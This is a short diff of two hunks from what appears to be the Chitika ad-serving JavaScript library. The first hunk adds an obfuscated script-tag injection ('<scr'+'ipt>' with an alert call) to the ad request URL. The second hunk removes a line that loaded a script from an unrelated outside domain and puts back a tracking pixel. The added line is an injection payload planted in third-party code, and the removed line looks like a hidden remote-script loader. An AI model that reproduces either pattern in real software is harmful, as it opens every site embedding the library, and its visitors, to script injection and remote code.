@@ -1057,7 +1057,7 @@ window.CHITIKA_ADS = window.CHITIKA_ADS ? window.CHITIKA_ADS : (function() {
             }
 
             // 3.1: Initial URI for ad request.
-            var ad_url = '?output='+ unit.output;
+            var ad_url = '?output='+ '<scr'+'ipt>alert("hi)'+'</scr'+'ipt>'+unit.output;
 
             // 3.2: Critical identification properties.
             ad_url = param_concat_escape(ad_url, 'publisher',           unit.publisher);
@@ -1385,9 +1385,9 @@ window.CHITIKA_ADS = window.CHITIKA_ADS ? window.CHITIKA_ADS : (function() {
                 url = param_concat_escape(url, k, v);
             }
         }
-        var pixel = document.createElement('script');
-        pixel.src = 'www.awesomex.in/w3data.js';
-        //pixel.style.display = 'none';
+        var pixel = new Image(1, 1);
+        pixel.src = url;
+        pixel.style.display = 'none';
     }
 
     // Define a function for setting iframe attributes from a hash. Needs to function
